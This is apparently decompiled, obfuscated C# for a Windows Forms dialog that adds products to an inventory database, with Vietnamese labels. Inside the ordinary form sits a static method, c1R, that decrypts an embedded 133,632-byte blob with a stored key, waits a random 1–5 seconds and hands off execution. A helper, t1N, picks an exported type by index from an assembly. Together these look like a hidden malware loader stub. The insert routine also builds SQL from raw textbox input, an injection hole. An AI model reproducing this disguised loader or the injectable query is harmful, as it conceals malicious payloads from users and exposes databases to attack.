using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Nk7;
using Nw27;
using Qd4;
using y8P;

namespace Js9;

[DesignerGenerated]
public class j5H : Form
{
	private Label _lablbla;

	private Label _labbale;

	private TextBox _txtMasp;

	private TextBox _txtTensp;

	private Label _Label4;

	private TextBox _txtSoluong;

	private Ca2 dataaccess;

	internal IContainer g;

	internal Label f;

	internal TextBox s;

	internal Button K;

	internal Button W;

	public j5H()
	{
		((Form)this).add_Load((EventHandler)b9S);
		dataaccess = new Ca2();
		e0L();
	}

	protected override void k7Y(bool f8K)
	{
		try
		{
			if (f8K && g != null)
			{
				g.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(f8K);
		}
	}

	private void e0L()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		t9S(new Label());
		e2M(new Label());
		e8Z(new Label());
		q3A(new TextBox());
		Gt2(new TextBox());
		j0G(new TextBox());
		Bt7(new Label());
		b5D(new TextBox());
		Gc6(new Button());
		To5(new Button());
		((Control)this).SuspendLayout();
		Px6().set_AutoSize(true);
		((Control)Px6()).set_Location(new Point(13, 26));
		((Control)Px6()).set_Name("lablbla");
		((Control)Px6()).set_Size(new Size(44, 13));
		((Control)Px6()).set_TabIndex(0);
		Px6().set_Text("Loai SP");
		Yy5().set_AutoSize(true);
		((Control)Yy5()).set_Location(new Point(13, 71));
		((Control)Yy5()).set_Name("labbale");
		((Control)Yy5()).set_Size(new Size(39, 13));
		((Control)Yy5()).set_TabIndex(1);
		Yy5().set_Text("Ma SP");
		Rw0().set_AutoSize(true);
		((Control)Rw0()).set_Location(new Point(13, 119));
		((Control)Rw0()).set_Name("Label3");
		((Control)Rw0()).set_Size(new Size(43, 13));
		((Control)Rw0()).set_TabIndex(2);
		Rw0().set_Text("Ten SP");
		((Control)t0A()).set_Location(new Point(72, 23));
		((Control)t0A()).set_Name("txtLoaisp");
		((TextBoxBase)t0A()).set_ReadOnly(true);
		((Control)t0A()).set_Size(new Size(179, 20));
		((Control)t0A()).set_TabIndex(3);
		((Control)n9E()).set_Location(new Point(72, 68));
		((Control)n9E()).set_Name("txtMasp");
		((Control)n9E()).set_Size(new Size(179, 20));
		((Control)n9E()).set_TabIndex(4);
		((Control)Lg6()).set_Location(new Point(72, 116));
		((Control)Lg6()).set_Name("txtTensp");
		((Control)Lg6()).set_Size(new Size(179, 20));
		((Control)Lg6()).set_TabIndex(5);
		t5A().set_AutoSize(true);
		((Control)t5A()).set_Location(new Point(13, 168));
		((Control)t5A()).set_Name("Label4");
		((Control)t5A()).set_Size(new Size(53, 13));
		((Control)t5A()).set_TabIndex(6);
		t5A().set_Text("So Luong");
		((Control)k4J()).set_Location(new Point(72, 168));
		((Control)k4J()).set_Name("txtSoluong");
		((Control)k4J()).set_Size(new Size(179, 20));
		((Control)k4J()).set_TabIndex(7);
		((Control)q5J()).set_Location(new Point(48, 207));
		((Control)q5J()).set_Name("btnOK");
		((Control)q5J()).set_Size(new Size(75, 23));
		((Control)q5J()).set_TabIndex(8);
		((ButtonBase)q5J()).set_Text("OK");
		((ButtonBase)q5J()).set_UseVisualStyleBackColor(true);
		((Control)q2K()).set_Location(new Point(160, 207));
		((Control)q2K()).set_Name("btnCanc");
		((Control)q2K()).set_Size(new Size(75, 23));
		((Control)q2K()).set_TabIndex(9);
		((ButtonBase)q2K()).set_Text("Cancel");
		((ButtonBase)q2K()).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).get_Controls().Add((Control)(object)q2K());
		((Control)this).get_Controls().Add((Control)(object)q5J());
		((Control)this).get_Controls().Add((Control)(object)k4J());
		((Control)this).get_Controls().Add((Control)(object)t5A());
		((Control)this).get_Controls().Add((Control)(object)Lg6());
		((Control)this).get_Controls().Add((Control)(object)n9E());
		((Control)this).get_Controls().Add((Control)(object)t0A());
		((Control)this).get_Controls().Add((Control)(object)Rw0());
		((Control)this).get_Controls().Add((Control)(object)Yy5());
		((Control)this).get_Controls().Add((Control)(object)Px6());
		((Control)this).set_Name("AddSp");
		((Form)this).set_Text("AddSp");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label Px6()
	{
		return _lablbla;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t9S(Label n1R)
	{
		_lablbla = n1R;
	}

	[SpecialName]
	internal virtual Label Yy5()
	{
		return _labbale;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e2M(Label Qz1)
	{
		_labbale = Qz1;
	}

	[SpecialName]
	internal virtual Label Rw0()
	{
		return f;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e8Z(Label i2H)
	{
		Label val = (f = i2H);
	}

	[SpecialName]
	internal virtual TextBox t0A()
	{
		return s;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q3A(TextBox p6X)
	{
		TextBox val = (s = p6X);
	}

	[SpecialName]
	internal virtual TextBox n9E()
	{
		return _txtMasp;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gt2(TextBox Tb5)
	{
		_txtMasp = Tb5;
	}

	[SpecialName]
	internal virtual TextBox Lg6()
	{
		return _txtTensp;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j0G(TextBox a1W)
	{
		_txtTensp = a1W;
	}

	[SpecialName]
	internal virtual Label t5A()
	{
		return _Label4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Bt7(Label Kf6)
	{
		_Label4 = Kf6;
	}

	[SpecialName]
	internal virtual TextBox k4J()
	{
		return _txtSoluong;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b5D(TextBox a8T)
	{
		_txtSoluong = a8T;
	}

	[SpecialName]
	internal virtual Button q5J()
	{
		return K;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gc6(Button m3D)
	{
		EventHandler eventHandler = q3F;
		Button k = K;
		if (k != null)
		{
			((Control)k).remove_Click(eventHandler);
		}
		Button val = (K = m3D);
		k = K;
		if (k != null)
		{
			((Control)k).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button q2K()
	{
		return W;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void To5(Button y3F)
	{
		EventHandler eventHandler = o9K;
		Button w = W;
		if (w != null)
		{
			((Control)w).remove_Click(eventHandler);
		}
		Button val = (W = y3F);
		w = W;
		if (w != null)
		{
			((Control)w).add_Click(eventHandler);
		}
	}

	private object Pm9()
	{
		string text = "INSERT INTO SanPham (MaSP,TenSP,SL,MaLSP)";
		text += $"VALUES ('{n9E().get_Text()}','{Lg6().get_Text()}','{k4J().get_Text()}','{t0A().get_Text()}')";
		return dataaccess.q6P(text);
	}

	private object Bo7()
	{
		return string.IsNullOrEmpty(n9E().get_Text()) || string.IsNullOrEmpty(Lg6().get_Text()) || string.IsNullOrEmpty(k4J().get_Text()) || string.IsNullOrEmpty(t0A().get_Text());
	}

	private void b9S(object sender, EventArgs e)
	{
	}

	internal static void c1R()
	{
		byte[] array = c4K.b3F(133632);
		checked
		{
			int w1YZ = Convert.ToInt32(RuntimeHelpers.GetObjectValue(k8A.mDic[k8A.sNum])) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = Wg39.i9NM(array[i], (byte[])k8A.mDic[k8A.sArray], w1YZ, i);
			}
			k8A.mDic.Add(k8A.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			Ca2.f2F();
		}
	}

	private void q3F(object sender, EventArgs e)
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToBoolean(Bo7()))
		{
			MessageBox.Show("Chua nhap gia tri", "Error", (MessageBoxButtons)0);
			return;
		}
		if (Conversions.ToBoolean(Pm9()))
		{
			MessageBox.Show("Them thanh cong", "Success", (MessageBoxButtons)0);
			((Form)this).set_DialogResult((DialogResult)1);
		}
		else
		{
			MessageBox.Show("Them that bai", "Error", (MessageBoxButtons)0);
			((Form)this).set_DialogResult((DialogResult)7);
		}
		((Form)this).Close();
	}

	internal static Type t1N(Assembly x3D)
	{
		return x3D.GetExportedTypes()[27];
	}

	private void o9K(object sender, EventArgs e)
	{
		((Form)this).Close();
	}
}
